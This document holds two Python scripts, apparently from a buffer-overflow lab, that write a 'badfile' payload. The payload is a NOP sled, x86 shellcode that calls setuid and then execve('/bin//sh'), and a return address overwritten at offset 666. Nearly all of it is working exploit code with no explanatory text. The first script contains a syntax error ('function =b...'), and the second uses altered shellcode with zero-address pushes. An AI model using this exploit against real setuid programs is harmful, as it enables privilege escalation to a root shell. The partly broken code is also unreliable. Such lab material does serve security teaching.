function =b"\xBB\xE5\x62\x55\x56\xFF\xD3\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xD2\x31\xC0\xB0\x0B\xCD\x80"
distance = 666
# ret addr = 0x56556286
ebp_8 = 0xffffd020
NOPs = 0x150
def p32(x):
    return x.to_bytes(4, "little")

total_ln = 1014

content = bytearray(0x90 for i in range(total_ln)) 

## shellcode at last:
shell_st =  total_ln - len(function)
content[shell_st : shell_st + len(function)] = function

ret_addr = ebp_8 + NOPs
offset = distance

L = 4

content[offset:offset+L] = p32(ret_addr)

with open("badfile", "wb") as f:
    f.write(content)


#!/usr/bin/python3
import sys 
 
# shellcode= ( 
# "\xBB\xE5\x62\x55\x56\xFF\xD3"
# "\x31\xc0" 
# "\x50"  
# "\x68""//sh" 
# "\x68""/bin" 
# "\x89\xe3" 
# "\x50" 
# "\x53" 
# "\x89\xe1" 
# "\x99" 
# "\xb0\x0b" 
# "\xcd\x80" 
# ).encode('latin-1') 
shellcode= ( 
"\xBB\xE5\x62\x55\x56\xFF\xD3\x31\xC0\x50\xFF\x35\x00\x00\x00\x00\xFF\x35\x00\x00\x00\x00\x89\xE3\x50\x53\x89\xE1\x31\xD2\x31\xC0\xB0\x0B\xCD\x80"
).encode('latin-1') 
 
total_ln = 1014
content = bytearray(0x90 for i in range(total_ln)) 
print(len(shellcode))
# Put the shellcode at the end 
start = total_ln - len(shellcode) 
content[start:] = shellcode 
 
# ret = 0xffffd018 + 250 
ret = 0xffffcff8 + 250 
offset = 666
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

